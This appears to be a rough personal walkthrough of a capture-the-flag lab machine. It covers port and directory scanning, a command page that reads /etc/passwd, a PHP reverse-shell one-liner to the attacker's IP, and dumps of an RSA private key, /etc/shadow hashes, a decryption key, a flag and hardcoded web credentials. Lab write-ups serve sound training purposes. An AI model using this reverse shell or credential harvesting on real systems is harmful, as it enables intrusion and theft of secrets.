### nmap
```bash
└─$ nmap 10.10.35.108   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 20:15 EDT
Nmap scan report for 10.10.35.108
Host is up (0.15s latency).
Not shown: 989 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp	got jpg file that has a b64.txt file in it need password
22/tcp  open  ssh
80/tcp  open  http	login page 	need username  charlie ???
100/tcp open  newacct	nothing
106/tcp open  pop3pw	nothing
109/tcp open  pop2	restricted
110/tcp open  pop3	restricted
111/tcp open  rpcbind	res
113/tcp open  ident	res
119/tcp open  nntp	res
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```

### dirsearch
 ```bash                                                                             
┌──(kali㉿kali)-[/hackme]
└─$ dirsearch -r -u 10.10.35.108                                             255 ⨯

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 10877

Output File: /home/kali/.dirsearch/reports/10.10.35.108/_21-06-16_20-36-08.txt

Error Log: /home/kali/.dirsearch/logs/errors-21-06-16_20-36-08.log

Target: http://10.10.35.108/

[20:36:08] Starting: 
[20:36:15] 403 -  277B  - /.ht_wsr.txt
[20:36:15] 403 -  277B  - /.htaccess.bak1
[20:36:15] 403 -  277B  - /.htaccess.orig
[20:36:15] 403 -  277B  - /.htaccess.sample
[20:36:15] 403 -  277B  - /.htaccess.save
[20:36:15] 403 -  277B  - /.htaccess_extra
[20:36:15] 403 -  277B  - /.htaccess_orig
[20:36:15] 403 -  277B  - /.htaccess_sc
[20:36:15] 403 -  277B  - /.htaccessBAK
[20:36:15] 403 -  277B  - /.htaccessOLD
[20:36:15] 403 -  277B  - /.htaccessOLD2
[20:36:15] 403 -  277B  - /.htm
[20:36:15] 403 -  277B  - /.html
[20:36:15] 403 -  277B  - /.htpasswds
[20:36:15] 403 -  277B  - /.htpasswd_test
[20:36:15] 403 -  277B  - /.httr-oauth
[20:36:17] 403 -  277B  - /.php
[20:36:19] 403 -  277B  - /.swp
[20:36:51] 200 -  569B  - /home.php
[20:36:53] 200 -  273B  - /index.php.bak
[20:36:53] 200 -    1KB - /index.html
[20:37:07] 403 -  277B  - /server-status/     (Added to queue)
[20:37:07] 403 -  277B  - /server-status
[20:37:17] Starting: server-status/
[20:37:20] 404 -  274B  - /server-status/%2e%2e//google.com

Task Completed
```
  
dirsearch gives us home.php which is an command page

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin charlie:x:1000:1000:localhost:/home/charley:/bin/bash 
```

we get a shell, from revshell.com
```bash
php -r '$sock=fsockopen("10.6.65.43",9001);exec("sh <&3 >&3 2>&3");'
```

stabilize the shell, can't cat user.txt, found a key, 
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```
```bash
# cat /etc/shadow

root:$6$.hWj2crD$ch//0HP/gRcEpyW10XktEpu0bDYU51MZaUuzHpb..Han2SFSiNEZgc1/utcnlKbyyhUKb768ouSAd8ITNlWlb/:18534:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18506:0:99999:7:::
ftp:*:18506:0:99999:7:::
charlie:$6$J1Cmev6V$ifUMOM0VViXR0/8BKz7FLIG8mkT5i1QHdzAXV6A.9l8g51baubW6QK4CHKuKzRGL75cmc/W6hv3VNUSOukcmM1:18534:0:99999:7:::
# 
```
charlie:2232

### root.py
```bash
# python root.py


Enter the key:  charlie
Traceback (most recent call last):
  File "root.py", line 3, in <module>
    key=input("Enter the key:  ")
  File "<string>", line 1, in <module>
NameError: name 'charlie' is not defined
```
```py
# cat root.py


from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)# 
```

### pyfiglet
```python
# cat pyfiglet

#!/usr/bin/python

# -*- coding: utf-8 -*-
import re
import sys

from pyfiglet import main

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```




went to write up ,,, the key was in key_rev_key

-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=


```bash
# python root.py
Enter the key:  '-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787fcb4e296b42124}
# 
```

to get charlies password:
```bash
# cd /var/www/html
# ls
home.jpg  home.php  image.png  index.html  index.php.bak  key_rev_key  validate.php
# cat validate.php
<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password=="cn7824"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";

```


why hashcat and john gave me 2232 as cracked password? 


